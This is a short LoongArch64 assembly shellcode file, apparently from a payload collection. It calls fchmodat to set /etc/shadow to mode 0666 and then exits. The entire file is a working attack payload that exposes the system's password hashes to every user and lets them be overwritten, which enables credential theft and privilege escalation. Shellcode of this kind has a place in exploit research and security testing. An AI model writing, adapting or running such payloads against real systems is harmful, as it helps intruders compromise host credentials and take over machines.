# LoongArch64 chmod(/etc/shadow, 0666) shellcode
# ---
# bcoles

.global _start
.section .text

_start:
    # sys_fchmodat(int dfd, const char *filename, umode_t mode, int flags)
    # fchmodat(AT_FDCWD, "/etc/shadow", 0666, 0)

    li.d    $a0, -100         # AT_FDCWD
    la      $a1, path         # pointer to path
    li.d    $a2, 0666         # mode
    li.d    $a3, 0            # flags
    li.d    $a7, 53           # __NR_fchmodat
    syscall 0x0101

    li.d    $a0, 0
    li.d    $a7, 93           # __NR_exit
    syscall 0x0101

path:
    .asciz "/etc/shadow"
